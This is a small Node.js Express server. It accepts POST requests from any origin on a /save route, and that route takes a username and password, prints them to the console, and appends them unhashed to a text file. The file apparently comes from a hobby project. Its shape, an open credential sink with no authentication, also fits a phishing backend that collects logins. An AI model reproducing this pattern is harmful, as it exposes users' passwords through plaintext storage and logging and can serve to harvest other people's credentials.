const express = require("express");
const cors = require("cors");
const fs = require("fs");

const app = express();

// ✅ Allow all origins (important for mobile/other devices)
app.use(cors({
  origin: "*"
}));

app.use(express.json());

// ✅ Test route
app.get("/", (req, res) => {
  res.send("✅ Server is working 🚀");
});

// ✅ Save data route
app.post("/save", (req, res) => {
  const data = req.body;

  if (!data.username || !data.password) {
    return res.status(400).json({ message: "Missing data ❌" });
  }

  console.log("📩 Received:", data);

  try {
    fs.appendFileSync("data.txt", JSON.stringify(data) + "\n");
    res.json({ message: "Saved successfully ✅" });
  } catch (err) {
    console.log(err);
    res.status(500).json({ message: "Error saving data ❌" });
  }
});

// ✅ IMPORTANT: dynamic port for deployment

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});